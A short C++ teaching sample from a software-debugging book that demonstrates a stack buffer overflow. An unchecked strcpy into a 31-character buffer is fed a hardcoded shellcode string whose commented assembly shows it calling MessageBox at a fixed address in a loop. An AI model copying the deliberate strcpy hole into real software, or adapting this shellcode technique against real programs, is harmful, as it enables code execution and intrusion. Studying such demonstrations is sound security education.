/*---------------------------------------------------------------------
BoAttack.cpp - Sample to show buffer overflow attack.  
Software Debugging by Raymond Zhang, All rights reserved. 
---------------------------------------------------------------------*/
#include "stdafx.h"
#ifdef _DEBUG
TCHAR SZ_INPUT[]="\x6a\x01\x33\xc0\
\x50\x50\x50\xba\x02\x07\x45\x7e\
\xff\xD2\x48\x85\xc0\x74\xed\
\x32\x32\x32\x32\x32\x31\x31\x31\x31\
\x31\x31\x31\x31\x31\x31\x31\x31\
\x30\x4a\x42";
#else
TCHAR SZ_INPUT[]="\x6a\x01\x33\xc0\
\x50\x50\x50\xba\x0b\x05\xd8\x77\
\xff\xD2\x48\x85\xc0\x74\xed\
\x32\x32\x32\x32\x32\x31\x31\x31\x31\
\x31\x31\x31\x31\
\x30\x70\x40";
#endif
//\xb8\xfe\x12";
/*	_asm
	{
TAG_LOOP:
		push MB_OKCANCEL
        xor eax,eax
        push eax
		push eax
		push eax
		mov edx, 77d8050bh // 7e450702
		call edx
		dec eax
		test eax,eax
		jz TAG_LOOP
	}
	*/
void HandleInput(LPCTSTR lpszInput)
{
	TCHAR szBuffer[31];
	strcpy(szBuffer,lpszInput);
	OutputDebugString(szBuffer);
	//process the content in buffer...
}

int APIENTRY WinMain(HINSTANCE hInstance,
   HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	MessageBox(NULL,"A sample to demo buffer overflow attack.",
		"AdvDbg",MB_OK);
	HandleInput(SZ_INPUT);
	return 0;
}



